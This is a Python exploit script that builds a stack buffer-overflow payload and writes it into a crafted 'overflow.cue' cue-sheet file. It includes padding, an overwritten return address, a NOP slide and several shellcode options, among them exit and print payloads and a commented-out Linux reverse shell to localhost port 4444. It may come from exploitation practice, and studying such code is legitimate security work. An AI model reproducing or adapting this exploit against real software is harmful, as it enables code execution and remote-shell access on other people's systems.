import struct

#TARGET_RIP = 0x7fffffffcb88  #0x7fffffffd3d0
TARGET_RIP = 0x7fffffffdc40 # RIP + 8 bytes (it changes everytime you run the exploit due to ASLR)
NEW_RIP_BYTES = struct.pack('<Q', TARGET_RIP)  # <Q Make it Little Endian

PADDING = b'G' * 2136

NOP_SLIDE = b'\x90' * 200

# int3 (for debugging)
SHELLCODE = b'\xcc\xcc\xcc\xcc'

# exit(0)
"""
https://electronicsreference.com/assembly-language/linux_syscalls/exit/
https://defuse.ca/online-x86-assembler.htm#disassembly
mov rax, 0x3c #exit
mov rdi, 0x0 #0
syscall
"""
SHELLCODE = b'\x48\xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7\x00\x00\x00\x00\x0f\x05'

# Write Pwned!
"""
mov rax, 0x1 #write
mov rdi, 0x1 #set stdout for write
lea rsi, [rip + 0xf] #set source with relative address
mov rdx, 0x7 #set data length=7 (Pwned!)
systemcall

https://defuse.ca/online-x86-assembler.htm#disassembly
"""
#SHELLCODE = b'\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00\x00\x48\x8d\x35\x0f\x00\x00\x00\x48\xc7\xc2\x07\x00\x00\x00\x0f\x05\x50\x77\x6e\x65\x64\x21'

# Rev Shell (https://privdayz.com/tools/shellcode-gen) Linux x86 RevShell 127.0.0.1 4444
#SHELLCODE = b'\x31\xc0\x50\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x50\xb0\x66\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x50\x50\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
#b'\x31\xc0\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\x31\xf6\x56\x52\xeb\x1c\x5b\x48\x89\xe6\x83\xc6\x08\xb0\x3b\x0f\x05'

PAYLOAD = PADDING + NEW_RIP_BYTES + NOP_SLIDE + SHELLCODE

# add peripheral items
cue = b'FILE "' + PAYLOAD + b'" BINARY\nTRACK 01 AUDIO\nINDEX 01 01:00:00\n'

# binary write (normal string does not work)
with open('overflow.cue', 'wb') as f:
    f.write(cue)